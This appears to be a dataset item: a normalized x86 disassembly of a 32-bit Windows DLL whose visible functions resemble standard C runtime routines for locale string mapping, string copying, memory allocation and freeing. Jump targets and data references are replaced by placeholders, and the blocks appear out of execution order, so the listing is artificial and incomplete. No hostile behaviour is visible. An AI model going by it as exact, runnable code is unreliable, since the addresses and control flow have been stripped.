mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_10012e7e
mov [ ebp - 0x1c ] 0x1
push eax
call sub_10013c5b
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000d8e6
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_100120e7
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10013c52
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018460
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_100184ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_10013c52
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_10013c5b
pop ecx
test eax eax
je r-xdata
push eax
call sub_10013c5b
pop ecx
test eax eax
je r-xdata
push eax
call sub_10013c5b
push [ rw-data ]
mov esi eax
call sub_10013c5b
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_10013be0
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10013be0
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10013be0
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10013be0
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_10013be0
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_10013c5b
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_10018623
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_1000ecdb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
sub_10018697
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_1000ecdb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
sub_1001874c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_10018797
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1000ced5
pop ecx
sub_100187b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_1001b0fc
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c0a5
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_1001b145
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_1000ced5
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_1000ced5
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10018797
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_1000cfb2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001b300
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_1000fe10
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_1001b145
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_1000cfb2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001b300
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_10018797
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_10018797
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_1000cfb2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001b300
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10018b5c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_100187b7
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10018ba1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_1001b0fc
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c0a5
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_1001b145
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_1000ced5
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1000fe10
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10018797
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1000cfb2
pop ecx
cmp eax ebx
je r-xdata
call sub_1001b300
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10018d5b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10018ba1
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10018d9d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1000ced5
push [ esi + 0x8 ]
call sub_1000ced5
push [ esi + 0xc ]
call sub_1000ced5
push [ esi + 0x10 ]
call sub_1000ced5
push [ esi + 0x14 ]
call sub_1000ced5
push [ esi + 0x18 ]
call sub_1000ced5
push [ esi ]
call sub_1000ced5
push [ esi + 0x20 ]
call sub_1000ced5
push [ esi + 0x24 ]
call sub_1000ced5
push [ esi + 0x28 ]
call sub_1000ced5
push [ esi + 0x2c ]
call sub_1000ced5
push [ esi + 0x30 ]
call sub_1000ced5
push [ esi + 0x34 ]
call sub_1000ced5
push [ esi + 0x1c ]
call sub_1000ced5
push [ esi + 0x38 ]
call sub_1000ced5
push [ esi + 0x3c ]
call sub_1000ced5
add esp 0x40
push [ esi + 0x40 ]
call sub_1000ced5
push [ esi + 0x44 ]
call sub_1000ced5
push [ esi + 0x48 ]
call sub_1000ced5
push [ esi + 0x4c ]
call sub_1000ced5
push [ esi + 0x50 ]
call sub_1000ced5
push [ esi + 0x54 ]
call sub_1000ced5
push [ esi + 0x58 ]
call sub_1000ced5
push [ esi + 0x5c ]
call sub_1000ced5
push [ esi + 0x60 ]
call sub_1000ced5
push [ esi + 0x64 ]
call sub_1000ced5
push [ esi + 0x68 ]
call sub_1000ced5
push [ esi + 0x6c ]
call sub_1000ced5
push [ esi + 0x70 ]
call sub_1000ced5
push [ esi + 0x74 ]
call sub_1000ced5
push [ esi + 0x78 ]
call sub_1000ced5
push [ esi + 0x7c ]
call sub_1000ced5
add esp 0x40
push [ esi + 0x80 ]
call sub_1000ced5
push [ esi + 0x84 ]
call sub_1000ced5
push [ esi + 0x88 ]
call sub_1000ced5
push [ esi + 0x8c ]
call sub_1000ced5
push [ esi + 0x90 ]
call sub_1000ced5
push [ esi + 0x94 ]
call sub_1000ced5
push [ esi + 0x98 ]
call sub_1000ced5
push [ esi + 0x9c ]
call sub_1000ced5
push [ esi + 0xa0 ]
call sub_1000ced5
push [ esi + 0xa4 ]
call sub_1000ced5
push [ esi + 0xa8 ]
call sub_1000ced5
add esp 0x2c
sub_10018f32
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
push esi
call sub_1000ced5
pop ecx
sub_10018f77
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000ced5
pop ecx
push esi
call sub_1000ced5
pop ecx
sub_10019010
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10019056
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_10019120
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10019160
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_1000c4bf
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_1000ecdb
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_1001787f
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_10019260
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10019294
push 0xc
push r--data
call sub_1000ed24
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_1000ecdb
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1000ed69
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_10010fec
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_100128f9
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019390
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000fe10
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_100193b2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
